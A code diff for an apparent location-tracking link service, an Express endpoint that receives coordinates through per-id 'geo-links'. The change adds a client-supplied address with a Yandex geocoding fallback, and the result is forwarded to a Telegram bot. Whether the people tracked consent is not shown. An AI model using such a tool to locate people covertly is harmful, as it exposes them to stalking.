@@ -38,15 +38,18 @@ async function getAddressFromCoords(lat, lon) {
 // Приём координат
 app.post('/api/track/:id', async (req, res) => {
   const { id } = req.params;
-  const { latitude, longitude } = req.body;
+  const { latitude, longitude, address: clientAddress } = req.body;
   if (!links[id]) {
     return res.status(404).json({ error: 'Invalid link' });
   }
   if (!latitude || !longitude) {
     return res.status(400).json({ error: 'No coordinates' });
   }
-  // Получаем адрес через Яндекс Геокодер
-  const address = await getAddressFromCoords(latitude, longitude);
+  let address = clientAddress;
+  if (!address) {
+    // Если адрес не пришёл с клиента, определяем через Яндекс
+    address = await getAddressFromCoords(latitude, longitude);
+  }
   // Отправка в Telegram
   const text = `Гео-ссылка: ${id}\nКоординаты: ${latitude}, ${longitude}\nАдрес: ${address}\nhttps://yandex.ru/maps/?ll=${longitude}%2C${latitude}&z=16`;
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
